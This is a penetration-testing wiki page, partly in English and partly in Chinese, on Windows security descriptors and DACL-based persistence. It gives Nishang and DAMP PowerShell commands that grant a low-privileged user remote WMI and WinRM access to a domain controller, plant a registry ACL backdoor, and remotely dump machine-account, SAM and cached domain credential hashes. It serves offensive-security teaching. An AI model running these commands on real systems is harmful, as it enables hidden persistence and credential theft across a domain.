# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors contain an owner SID, a primary-group SID, a discretionary ACL (DACL) that controls access, and a system ACL (SACL) used mainly for auditing. Security Descriptor Definition Language (SDDL) is the textual representation; an ACE string has the form `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

A security descriptor stores who owns a securable object and which principals are allowed or denied specific rights over it. If an attacker can change a DACL, they may grant a low-privileged principal rights that normally require an administrative role.

This makes narrowly modified descriptors useful for persistence: the account remains outside obvious privileged groups while retaining access to a particular management surface. Preserve the original descriptor before testing so the change can be removed exactly.

### Access to WMI

You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### 访问 WinRM

使用 Nishang 的 `Set-RemotePSRemoting` 函数授予用户访问远程 PowerShell/WinRM endpoint 的权限：<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 远程访问 hashes

DAMP 可以创建一个 registry-ACL backdoor，之后允许远程获取 machine-account hash、local SAM hashes 和 cached domain credentials。向一个原本普通的账户授予这些范围狭窄的权限——尤其是针对 domain controller——无需 privileged-group membership，即可提供强大的 persistence。<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
查看 [**Silver Tickets**](silver-ticket.md)，了解如何使用 Domain Controller 的计算机帐户哈希。

## References

- [1] [安全描述符定义语言 - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - 自主访问控制列表修改项目](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — 安全描述符字符串格式](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
